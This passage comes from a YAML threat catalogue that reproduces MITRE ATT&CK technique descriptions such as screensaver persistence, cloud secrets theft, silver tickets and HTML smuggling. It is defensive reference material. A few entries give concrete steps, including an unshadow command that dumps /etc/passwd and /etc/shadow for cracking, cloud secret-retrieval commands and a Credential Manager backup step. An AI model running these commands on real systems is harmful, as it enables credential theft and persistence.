      and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with
      screensavers included with base Windows installations.


      The following screensaver settings are stored in the Registry (<code>HKCU\Control
      Panel\Desktop\</code>) and could be manipulated to achieve persistence:


      * <code>SCRNSAVE.exe</code> - set to malicious PE path

      * <code>ScreenSaveActive</code> - set to ''1'' to enable the screensaver

      * <code>ScreenSaverIsSecure</code> - set to ''0'' to not require a password
      to unlock

      * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver
      is executed


      Adversaries can use screensaver settings to maintain persistence by setting
      the screensaver to run malware after a certain timeframe of user inactivity.(Citation:
      ESET Gazer Aug 2017)

      https://attack.mitre.org/techniques/T1546/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.009
    ref_id: T1556.009
    name: Conditional Access Policies
    description: "Adversaries may disable or modify conditional access policies to\
      \ enable persistent access to compromised accounts. Conditional access policies\
      \ are additional verifications used by identity providers and identity and access\
      \ management systems to determine whether a user should be granted access to\
      \ a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be\
      \ denied access to applications based on their IP address, device enrollment\
      \ status, and use of multi-factor authentication.(Citation: Microsoft Conditional\
      \ Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional\
      \ Access Policies) In some cases, identity providers may also support the use\
      \ of risk-based metrics to deny sign-ins based on a variety of indicators. In\
      \ AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary\
      \ constraints such as the source IP, the date the request was made, and the\
      \ nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation:\
      \ GCP IAM Conditions) These measures help to prevent compromised credentials\
      \ from resulting in unauthorized access to data or resources, as well as limit\
      \ user permissions to only those required. \n\nBy modifying conditional access\
      \ policies, such as adding additional trusted IP ranges, removing [Multi-Factor\
      \ Authentication](https://attack.mitre.org/techniques/T1556/006) requirements,\
      \ or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535),\
      \ adversaries may be able to ensure persistent access to accounts and circumvent\
      \ defensive measures.\nhttps://attack.mitre.org/techniques/T1556/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.002
    ref_id: T1578.002
    name: Create Cloud Instance
    description: 'An adversary may create a new instance or virtual machine (VM) within
      the compute service of a cloud account to evade defenses. Creating a new instance
      may allow an adversary to bypass firewall rules and permissions that exist on
      instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001)
      of one or more volumes in an account, create a new instance, mount the snapshots,
      and then apply a less restrictive security policy to collect [Data from Local
      System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation:
      Mandiant M-Trends 2020)


      Creating a new instance may also allow an adversary to carry out malicious activity
      within an environment without affecting the execution of current running instances.

      https://attack.mitre.org/techniques/T1578/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.006
    ref_id: T1555.006
    name: Cloud Secrets Management Stores
    description: "Adversaries may acquire credentials from cloud-native secret management\
      \ solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault,\
      \ and Terraform Vault.  \n\nSecrets managers support the secure centralized\
      \ management of passwords, API keys, and other credential material. Where secrets\
      \ managers are in use, cloud services can dynamically acquire credentials via\
      \ API requests rather than accessing secrets insecurely stored in plain text\
      \ files or environment variables.  \n\nIf an adversary is able to gain sufficient\
      \ privileges in a cloud environment \u2013 for example, by obtaining the credentials\
      \ of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)\
      \ or compromising a service that has permission to retrieve secrets \u2013 they\
      \ may be able to request secrets from the secrets manager. This can be accomplished\
      \ via commands such as `get-secret-value` in AWS, `gcloud secrets describe`\
      \ in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered\
      \ Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation:\
      \ Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)\n\n**Note:** this\
      \ technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)\
      \ in that the credentials are being directly requested from the cloud secrets\
      \ manager, rather than through the medium of the instance metadata API.\nhttps://attack.mitre.org/techniques/T1555/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.003
    ref_id: T1213.003
    name: Code Repositories
    description: 'Adversaries may leverage code repositories to collect valuable information.
      Code repositories are tools/services that store source code and automate software
      builds. They may be hosted internally or privately on third party sites such
      as Github, GitLab, SourceForge, and BitBucket. Users typically interact with
      code repositories through a web application or command-line utilities such as
      git.


      Once adversaries gain access to a victim network or a private code repository,
      they may collect sensitive information such as proprietary source code or [Unsecured
      Credentials](https://attack.mitre.org/techniques/T1552) contained within software''s
      source code.  Having access to software''s source code may allow adversaries
      to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while
      credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:
      Wired Uber Breach)(Citation: Krebs Adobe)


      **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003),
      which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043)
      via public code repositories.

      https://attack.mitre.org/techniques/T1213/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.002
    ref_id: T1565.002
    name: Transmitted Data Manipulation
    description: 'Adversaries may alter data en route to storage or other systems
      in order to manipulate external outcomes or hide activity, thus threatening
      the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus
      Sony 2018) By manipulating transmitted data, adversaries may attempt to affect
      a business process, organizational understanding, and decision making.


      Manipulation may be possible over a network connection or between system processes
      where there is an opportunity deploy a tool that will intercept and change information.
      The type of modification and the impact it will have depends on the target transmission
      mechanism as well as the goals and objectives of the adversary. For complex
      systems, an adversary would likely need special expertise and possibly access
      to specialized software related to the system that would typically be gained
      through a prolonged information gathering campaign in order to have the desired
      impact.

      https://attack.mitre.org/techniques/T1565/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.008
    ref_id: T1003.008
    name: /etc/passwd and /etc/shadow
    description: 'Adversaries may attempt to dump the contents of <code>/etc/passwd</code>
      and <code>/etc/shadow</code> to enable offline password cracking. Most modern
      Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code>
      to store user account information including password hashes in <code>/etc/shadow</code>.
      By default, <code>/etc/shadow</code> is only readable by the root user.(Citation:
      Linux Password and Shadow File Formats)


      The Linux utility, unshadow, can be used to combine the two files in a format
      suited for password cracking utilities such as John the Ripper:(Citation: nixCraft
      - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>

      https://attack.mitre.org/techniques/T1003/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.001
    ref_id: T1543.001
    name: Launch Agent
    description: "Adversaries may create or modify launch agents to repeatedly execute\
      \ malicious payloads as part of persistence. When a user logs in, a per-user\
      \ launchd process is started which loads the parameters for each launch-on-demand\
      \ user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>,\
      \ <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation:\
      \ AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation:\
      \ Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments\
      \ </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name,\
      \ executable location, and execution time.(Citation: OSX.Dok Malware) Launch\
      \ Agents are often installed to perform updates to programs, launch user specified\
      \ programs at login, or to conduct other developer tasks.\n\n Launch Agents\
      \ can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001)\
      \ command.\n \nAdversaries may install a new Launch Agent that executes at login\
      \ by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code>\
      \ or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy\
      \ Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent\
      \ name may be disguised by using a name from the related operating system or\
      \ benign software. Launch Agents are created with user level privileges and\
      \ execute with user level permissions.(Citation: OSX Malware Detection)(Citation:\
      \ OceanLotus for OS X)\nhttps://attack.mitre.org/techniques/T1543/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569
    ref_id: T1569
    name: System Services
    description: 'Adversaries may abuse system services or daemons to execute commands
      or programs. Adversaries can execute malicious content by interacting with or
      creating services either locally or remotely. Many services are set to run at
      boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)),
      but adversaries can also abuse services for one-time or temporary execution.

      https://attack.mitre.org/techniques/T1569'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.003
    ref_id: T1059.003
    name: Windows Command Shell
    description: 'Adversaries may abuse the Windows command shell for execution. The
      Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the
      primary command prompt on Windows systems. The Windows command prompt can be
      used to control almost any aspect of a system, with various permission levels
      required for different subsets of commands. The command prompt can be invoked
      remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such
      as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)


      Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential
      commands to run, as well as normal scripting operations such as conditionals
      and loops. Common uses of batch files include long or repetitive tasks, or the
      need to run the same set of commands on multiple systems.


      Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute
      various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106)
      to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106)
      interactively with input and output forwarded over a command and control channel.

      https://attack.mitre.org/techniques/T1059/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.009
    ref_id: T1055.009
    name: Proc Memory
    description: "Adversaries may inject malicious code into processes via the /proc\
      \ filesystem in order to evade process-based defenses as well as possibly elevate\
      \ privileges. Proc memory injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nProc memory injection\
      \ involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>)\
      \ then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.\
      \ Each running process has its own directory, which includes memory mappings.\
      \ Proc memory injection is commonly performed by overwriting the target processes\u2019\
      \ stack using memory mappings provided by the /proc filesystem. This information\
      \ can be used to enumerate offsets (including the stack) and gadgets (or instructions\
      \ within the program that can be used to build a malicious payload) otherwise\
      \ hidden by process memory protections such as address space layout randomization\
      \ (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/[pid]/maps</code>\
      \ can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux\
      \ Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker\
      \ Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate\
      \ a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),\
      \ proc memory injection may target child processes (such as a backgrounded copy\
      \ of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context\
      \ of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via proc memory injection\
      \ may also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1650
    ref_id: T1650
    name: Acquire Access
    description: "Adversaries may purchase or otherwise acquire an existing access\
      \ to a target system or network. A variety of online services and initial access\
      \ broker networks are available to sell access to previously compromised systems.(Citation:\
      \ Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation:\
      \ Krebs Access Brokers Fortune 500) In some cases, adversary groups may form\
      \ partnerships to share compromised systems with each other.(Citation: CISA\
      \ Karakurt 2022)\n\nFootholds to compromised systems may take a variety of forms,\
      \ such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003))\
      \ or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133).\
      \ In some cases, access brokers will implant compromised systems with a \u201C\
      load\u201D that can be used to install additional malware for paying customers.(Citation:\
      \ Microsoft Ransomware as a Service)\n\nBy leveraging existing access broker\
      \ networks rather than developing or obtaining their own initial access capabilities,\
      \ an adversary can potentially reduce the resources required to gain a foothold\
      \ on a target network and focus their efforts on later stages of compromise.\
      \ Adversaries may prioritize acquiring access to systems that have been determined\
      \ to lack security monitoring or that have high privileges, or systems that\
      \ belong to organizations in a particular sector.(Citation: Microsoft Ransomware\
      \ as a Service)(Citation: CrowdStrike Access Brokers)\n\nIn some cases, purchasing\
      \ access to an organization in sectors such as IT contracting, software development,\
      \ or telecommunications may allow an adversary to compromise additional victims\
      \ via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor\
      \ Authentication Interception](https://attack.mitre.org/techniques/T1111), or\
      \ even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).\n\
      \n**Note:** while this technique is distinct from other behaviors such as [Purchase\
      \ Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001),\
      \ they may often be used in conjunction (especially where the acquired foothold\
      \ requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1650"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1601.001
    ref_id: T1601.001
    name: Patch System Image
    description: "Adversaries may modify the operating system of a network device\
      \ to introduce new capabilities or weaken existing defenses.(Citation: Killing\
      \ the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation:\
      \ Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation:\
      \ Juniper Netscreen of the Dead) Some network devices are built with a monolithic\
      \ architecture, where the entire operating system and most of the functionality\
      \ of the device is contained within a single file.  Adversaries may change this\
      \ file in storage, to be loaded in a future boot, or in memory during runtime.\n\
      \nTo change the operating system in storage, the adversary will typically use\
      \ the standard procedures available to device operators. This may involve downloading\
      \ a new file via typical protocols used on network devices, such as TFTP, FTP,\
      \ SCP, or a console connection.  The original file may be overwritten, or a\
      \ new file may be written alongside of it and the device reconfigured to boot\
      \ to the compromised image.\n\nTo change the operating system in memory, the\
      \ adversary typically can use one of two methods. In the first, the adversary\
      \ would make use of native debug commands in the original, unaltered running\
      \ operating system that allow them to directly modify the relevant memory addresses\
      \ containing the running operating system.  This method typically requires administrative\
      \ level access to the device.\n\nIn the second method for changing the operating\
      \ system in memory, the adversary would make use of the boot loader. The boot\
      \ loader is the first piece of software that loads when the device starts that,\
      \ in turn, will launch the operating system.  Adversaries may use malicious\
      \ code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)\
      \ method, to directly manipulate running operating system code in memory.  This\
      \ malicious code in the bootloader provides the capability of direct memory\
      \ manipulation to the adversary, allowing them to patch the live operating system\
      \ during runtime.\n\nBy modifying the instructions stored in the system image\
      \ file, adversaries may either weaken existing defenses or provision new capabilities\
      \ that the device did not have before. Examples of existing defenses that can\
      \ be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600),\
      \ authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004),\
      \ and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).\
      \  Adding new capabilities for the adversary\u2019s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001),\
      \ [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port\
      \ Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may\
      \ also compromise existing commands in the operating system to produce false\
      \ output to mislead defenders.   When this method is used in conjunction with\
      \ [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one\
      \ example of a compromised system command may include changing the output of\
      \ the command that shows the version of the currently running operating system.\
      \  By patching the operating system, the adversary can change this command to\
      \ instead display the original, higher revision number that they replaced through\
      \ the system downgrade. \n\nWhen the operating system is patched in storage,\
      \ this can be achieved in either the resident storage (typically a form of flash\
      \ memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005).\
      \ \n\nWhen the technique is performed on the running operating system in memory\
      \ and not on the stored copy, this technique will not survive across reboots.\
      \  However, live memory modification of the operating system can be combined\
      \ with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve\
      \ persistence.\nhttps://attack.mitre.org/techniques/T1601/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.002
    ref_id: T1558.002
    name: Silver Ticket
    description: 'Adversaries who have the password hash of a target service account
      (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets,
      also known as silver tickets. Kerberos TGS tickets are also known as service
      tickets.(Citation: ADSecurity Silver Tickets)


      Silver tickets are more limited in scope in than golden tickets in that they
      only enable adversaries to access a particular resource (e.g. MSSQL) and the
      system that hosts the resource; however, unlike golden tickets, adversaries
      with the ability to forge silver tickets are able to create TGS tickets without
      interacting with the Key Distribution Center (KDC), potentially making detection
      more difficult.(Citation: ADSecurity Detecting Forged Tickets)


      Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).

      https://attack.mitre.org/techniques/T1558/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213
    ref_id: T1213
    name: Data from Information Repositories
    description: "Adversaries may leverage information repositories to mine valuable\
      \ information. Information repositories are tools that allow for storage of\
      \ information, typically to facilitate collaboration or information sharing\
      \ between users, and can store a wide variety of data that may aid adversaries\
      \ in further objectives, such as Credential Access, Lateral Movement, or Defense\
      \ Evasion, or direct access to the target information. Adversaries may also\
      \ abuse external sharing features to share sensitive documents with recipients\
      \ outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).\
      \ \n\nThe following is a brief list of example information that may hold potential\
      \ value to an adversary and may also be found on an information repository:\n\
      \n* Policies, procedures, and standards\n* Physical / logical network diagrams\n\
      * System architecture diagrams\n* Technical system documentation\n* Testing\
      \ / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))\
      \ \n* Work / project schedules\n* Source code snippets\n* Links to network shares\
      \ and other internal resources\n* Contact or other sensitive information about\
      \ business partners and customers, including personally identifiable information\
      \ (PII) \n\nInformation stored in a repository may vary based on the specific\
      \ instance or environment. Specific common information repositories include\
      \ the following:\n\n* Storage services such as IaaS databases, enterprise databases,\
      \ and more specialized platforms such as customer relationship management (CRM)\
      \ databases \n* Collaboration platforms such as SharePoint, Confluence, and\
      \ code repositories\n* Messaging platforms such as Slack and Microsoft Teams\
      \ \n\nIn some cases, information repositories have been improperly secured,\
      \ typically by unintentionally allowing for overly-broad access by all users\
      \ or even public access to unauthenticated users. This is particularly common\
      \ with cloud-native or cloud-hosted services, such as AWS Relational Database\
      \ Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro\
      \ Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)\nhttps://attack.mitre.org/techniques/T1213"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.009
    ref_id: T1070.009
    name: Clear Persistence
    description: "Adversaries may clear artifacts associated with previously established\
      \ persistence on a host system to remove evidence of their activity. This may\
      \ involve various actions, such as removing services, deleting executables,\
      \ [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File\
      \ Modification](https://attack.mitre.org/techniques/T1647), or other methods\
      \ of cleanup to prevent defenders from collecting evidence of their persistent\
      \ presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts\
      \ previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation:\
      \ Talos - Cisco Attack 2022)\n\nIn some instances, artifacts of persistence\
      \ may also be removed once an adversary\u2019s persistence is executed in order\
      \ to prevent errors with the new instance of the malware.(Citation: NCC Group\
      \ Team9 June 2020)\nhttps://attack.mitre.org/techniques/T1070/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.004
    ref_id: T1555.004
    name: Windows Credential Manager
    description: "Adversaries may acquire credentials from the Windows Credential\
      \ Manager. The Credential Manager stores credentials for signing into websites,\
      \ applications, and/or devices that request authentication through NTLM or Kerberos\
      \ in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft\
      \ Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows\
      \ Credential Manager separates website credentials from application or network\
      \ credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003),\
      \ Internet Explorer and Microsoft Edge website credentials are managed by the\
      \ Credential Manager and are stored in the Web Credentials locker. Application\
      \ and network credentials are stored in the Windows Credentials locker.\n\n\
      Credential Lockers store credentials in encrypted `.vcrd` files, located under\
      \ `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\\
      `. The encryption key can be found in a file named <code>Policy.vpol</code>,\
      \ typically located in the same folder as the credentials.(Citation: passcape\
      \ Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may\
      \ list credentials managed by the Windows Credential Manager through several\
      \ mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that\
      \ can be used to enumerate credentials stored in the Credential Locker through\
      \ a command-line interface. Adversaries may also gather credentials by directly\
      \ reading files located inside of the Credential Lockers. Windows APIs, such\
      \ as <code>CredEnumerateA</code>, may also be absued to list credentials managed\
      \ by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy\
      \ Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from\
      \ credential backups. Credential backups and restorations may be performed by\
      \ running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the\
      \ \u201CBack up...\u201D button on the \u201CStored User Names and Passwords\u201D\
      \ GUI.\n\nPassword recovery tools may also obtain plain text passwords from\
      \ the Credential Manager.(Citation: Malwarebytes The Windows Vault)\nhttps://attack.mitre.org/techniques/T1555/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.010
    ref_id: T1036.010
    name: Masquerade Account Name
    description: "Adversaries may match or approximate the names of legitimate accounts\
      \ to make newly created ones appear benign. This will typically occur during\
      \ [Create Account](https://attack.mitre.org/techniques/T1136), although accounts\
      \ may also be renamed at a later date. This may also coincide with [Account\
      \ Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first\
      \ deletes an account before re-creating one with the same name.(Citation: Huntress\
      \ MOVEit 2023)\n\nOften, adversaries will attempt to masquerade as service accounts,\
      \ such as those associated with legitimate software, data backups, or container\
      \ cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec\
      \ Kubernetes Attack 2023) They may also give accounts generic, trustworthy names,\
      \ such as \u201Cadmin\u201D, \u201Chelp\u201D, or \u201Croot.\u201D(Citation:\
      \ Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account\
      \ names off of those already existing in the system, as a follow-on behavior\
      \ to [Account Discovery](https://attack.mitre.org/techniques/T1087).  \n\nNote\
      \ that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656),\
      \ which describes impersonating specific trusted individuals or organizations,\
      \ rather than user or service account names.\nhttps://attack.mitre.org/techniques/T1036/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1200
    ref_id: T1200
    name: Hardware Additions
    description: 'Adversaries may introduce computer accessories, networking hardware,
      or other computing devices into a system or network that can be used as a vector
      to gain access. Rather than just connecting and distributing payloads via removable
      storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)),
      more robust hardware additions can be used to introduce new functionalities
      and/or features into a system that can then be abused.


      While public references of usage by threat actors are scarce, many red teams/penetration
      testers leverage hardware additions for initial access. Commercial and open
      source products can be leveraged with capabilities such as passive network tapping,
      network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)),
      keystroke injection, kernel memory reading via DMA, addition of new wireless
      access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation:
      Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan
      Pwn March 2012)

      https://attack.mitre.org/techniques/T1200'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505
    ref_id: T1505
    name: Server Software Component
    description: 'Adversaries may abuse legitimate extensible development features
      of servers to establish persistent access to systems. Enterprise server applications
      may include features that allow developers to write and install software or
      scripts to extend the functionality of the main application. Adversaries may
      install malicious components to extend and abuse server applications.(Citation:
      volexity_0day_sophos_FW)

      https://attack.mitre.org/techniques/T1505'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1485
    ref_id: T1485
    name: Data Destruction
    description: 'Adversaries may destroy data and files on specific systems or in
      large numbers on a network to interrupt availability to systems, services, and
      network resources. Data destruction is likely to render stored data irrecoverable
      by forensic techniques through overwriting files or data on local and remote
      drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation:
      Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit
      42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system
      file deletion commands such as <code>del</code> and <code>rm</code> often only
      remove pointers to files without wiping the contents of the files themselves,
      making the files recoverable by proper forensic methodology. This behavior is
      distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)
      and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because
      individual files are destroyed rather than sections of a storage disk or the
      disk''s logical structure.


      Adversaries may attempt to overwrite files and directories with randomly generated
      data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation:
      Unit 42 Shamoon3 2018) In some cases politically oriented image files have been
      used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto
      Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware designed for destroying data
      may have worm-like features to propagate across a network by leveraging additional
      techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec
      Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon
      Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer
      2018).


      In cloud environments, adversaries may leverage access to delete cloud storage
      objects, machine images, database instances, and other infrastructure crucial
      to operations to damage an organization or their customers.(Citation: Data Destruction
      - Threat Post)(Citation: DOJ  - Cisco Insider)

      https://attack.mitre.org/techniques/T1485'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132.002
    ref_id: T1132.002
    name: Non-Standard Encoding
    description: 'Adversaries may encode data with a non-standard data encoding system
      to make the content of command and control traffic more difficult to detect.
      Command and control (C2) information can be encoded using a non-standard data
      encoding system that diverges from existing protocol specifications. Non-standard
      data encoding schemes may be based on or related to standard data encoding schemes,
      such as a modified Base64 encoding for the message body of an HTTP request.(Citation:
      Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)

      https://attack.mitre.org/techniques/T1132/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.001
    ref_id: T1556.001
    name: Domain Controller Authentication
    description: "Adversaries may patch the authentication process on a domain controller\
      \ to bypass the typical authentication mechanisms and enable access to accounts.\
      \ \n\nMalware may be used to inject false credentials into the authentication\
      \ process on a domain controller with the intent of creating a backdoor used\
      \ to access any user\u2019s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)).\
      \ Skeleton key works through a patch on an enterprise domain controller authentication\
      \ process (LSASS) with credentials that adversaries may use to bypass the standard\
      \ authentication system. Once patched, an adversary can use the injected password\
      \ to successfully authenticate as any domain user account (until the the skeleton\
      \ key is erased from memory by a reboot of the domain controller). Authenticated\
      \ access may enable unfettered access to hosts and/or resources within single-factor\
      \ authentication environments.(Citation: Dell Skeleton)\nhttps://attack.mitre.org/techniques/T1556/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1537
    ref_id: T1537
    name: Transfer Data to Cloud Account
    description: 'Adversaries may exfiltrate data by transferring the data, including
      through sharing/syncing and creating backups of cloud environments, to another
      cloud account they control on the same service.


      A defender who is monitoring for large transfers to outside the cloud environment
      through normal file transfers or over command and control channels may not be
      watching for data transfers to another account within the same cloud provider.
      Such transfers may utilize existing cloud provider APIs and the internal address
      space of the cloud provider to blend into normal traffic or avoid data transfers
      over external network interfaces.(Citation: TLDRSec AWS Attacks)


      Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled
      cloud accounts, such as creating anonymous file sharing links or, in Azure,
      a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared
      Access Signature)


      Incidents have been observed where adversaries have created backups of cloud
      instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment
      Jul 2018)

      https://attack.mitre.org/techniques/T1537'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.006
    ref_id: T1027.006
    name: HTML Smuggling
    description: 'Adversaries may smuggle data and files past content filters by hiding
      malicious payloads inside of seemingly benign HTML files. HTML documents can
      store large binary objects known as JavaScript Blobs (immutable data that represents
      raw bytes) that can later be constructed into file-like objects. Data may also
      be stored in Data URLs, which enable embedding media type or MIME files inline
      of HTML documents. HTML5 also introduced a download attribute that may be used
      to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation:
      Outlflank HTML Smuggling 2018)


      Adversaries may deliver payloads to victims that bypass security controls through
      HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes.
      Security controls such as web content filters may not identify smuggled malicious
      files inside of HTML/JS files, as the content may be based on typically benign
      MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious
      files or data can be obfuscated and hidden inside of HTML files through Data
      URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim
